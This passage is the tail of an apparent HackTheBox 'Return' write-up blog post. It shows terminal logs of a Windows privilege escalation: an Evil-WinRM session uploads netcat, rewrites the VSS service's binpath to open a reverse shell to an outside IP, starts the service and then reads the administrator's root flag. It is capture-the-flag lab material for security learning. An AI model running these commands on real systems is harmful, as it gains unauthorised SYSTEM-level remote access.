+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs powershell">*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\svc<span class="hljs-literal">-printer</span>\Documents&gt; <span class="hljs-built_in">CD</span> C:\programdata<br>*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\programdata&gt; upload /home/mosaictheory/Tools/n<br>/home/mosaictheory/Tools/nc               /home/mosaictheory/Tools/nmapscripts.list<br>*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\programdata&gt; upload /home/mosaictheory/Tools/nc/nc<br>/home/mosaictheory/Tools/nc/nc.exe   /home/mosaictheory/Tools/nc/nc64.exe<br>*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\programdata&gt; upload /home/mosaictheory/Tools/nc/nc64.exe<br>Info: Uploading /home/mosaictheory/Tools/nc/nc64.exe to C:\programdata\nc64.exe<br>                                                             <br><span class="hljs-keyword">Data</span>: <span class="hljs-number">60360</span> bytes of <span class="hljs-number">60360</span> bytes copied<br><br>Info: Upload successful!<br><br>*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\programdata&gt; sc.exe config VSS binpath=<span class="hljs-string">&quot;C:\windows\system32\cmd.exe /c C:\programdata\nc64.exe -e cmd 10.10.16.6 9001&quot;</span><br>[<span class="hljs-type">SC</span>] ChangeServiceConfig SUCCESS<br>*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\programdata&gt; sc.exe <span class="hljs-built_in">start</span> VSS<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bat"><span class="hljs-function">C:\<span class="hljs-title">Users</span>\<span class="hljs-title">Administrator</span>&gt;<span class="hljs-title">cd</span> <span class="hljs-title">Desktop</span></span><br><span class="hljs-function"><span class="hljs-title">cd</span> <span class="hljs-title">Desktop</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">C</span>:\<span class="hljs-title">Users</span>\<span class="hljs-title">Administrator</span>\<span class="hljs-title">Desktop</span>&gt;<span class="hljs-title">type</span> <span class="hljs-title">root.txt</span></span><br><span class="hljs-function"><span class="hljs-title">type</span> <span class="hljs-title">root.txt</span></span><br><span class="hljs-function">4<span class="hljs-title">f6</span>....................................</span><br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/HackTheBox/" class="category-chain-item">HackTheBox</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Windows/">#Windows</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>HackTheBox-Return</div>
+      <div>http://example.com/2022/10/06/HackTheBox-Return/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>Mosaic Theory</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>October 6, 2022</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/10/06/HackTheBox-Json/" title="HackTheBox-Json">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">HackTheBox-Json</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/10/06/HackTheBox-Silo/" title="HackTheBox-Silo-Oracle测试">
+                        <span class="hidden-mobile">HackTheBox-Silo-Oracle测试</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;Table of Contents</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
